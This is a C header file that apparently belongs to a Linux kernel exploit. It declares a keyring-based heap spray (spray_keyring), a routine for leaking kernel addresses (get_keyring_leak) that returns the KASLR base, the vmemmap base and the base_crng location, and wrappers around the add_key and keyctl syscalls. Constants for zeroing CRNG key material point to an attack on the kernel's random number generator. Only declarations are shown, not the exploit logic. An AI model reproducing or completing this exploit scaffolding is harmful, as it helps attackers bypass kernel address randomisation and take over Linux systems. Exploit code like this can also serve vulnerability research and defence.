#ifndef _KEYRING_H_
#define _KEYRING_H_

#include <stdint.h>
#include <unistd.h>
#include <sys/syscall.h>
#include "offsets.h"

#define BASE_CRNG_KEY_SIZE          32
#define BASE_CRNG_GEN_SIZE          8
#define BASE_CRNG_ZAP_SIZE          (BASE_CRNG_KEY_SIZE + BASE_CRNG_GEN_SIZE)
#define PENDING_BIT_ZAP_SIZE        1

#define VMEMMAP_MASK 0xfffffffff0000000

#define KEY_DESC_MAX_SIZE 40

#define PREFIX_BUF_LEN 16
#define RCU_HEAD_LEN 16

#define SPRAY_KEY_SIZE 50


struct keyring_payload {
    uint8_t prefix[PREFIX_BUF_LEN];
    uint8_t rcu_buf[RCU_HEAD_LEN];
    unsigned short len;
};

struct leak {
    long kaslr_base;
    long vmemmap_base;
    long base_crng;
    long pending_bit;
};

typedef int32_t key_serial_t;

static inline key_serial_t add_key(const char *type, const char *description, const void *payload, size_t plen, key_serial_t ringid) {
    return syscall(__NR_add_key, type, description, payload, plen, ringid);
}

static inline long keyctl(int operation, unsigned long arg2, unsigned long arg3, unsigned long arg4, unsigned long arg5) {
    return syscall(__NR_keyctl, operation, arg2, arg3, arg4, arg5);
}

key_serial_t *spray_keyring(uint32_t spray_size);
struct leak *get_keyring_leak(key_serial_t *id_buffer, uint32_t id_buffer_size);
void release_keys(key_serial_t *id_buffer, uint32_t id_buffer_size);

#endif /* _KEYRING_H_ */
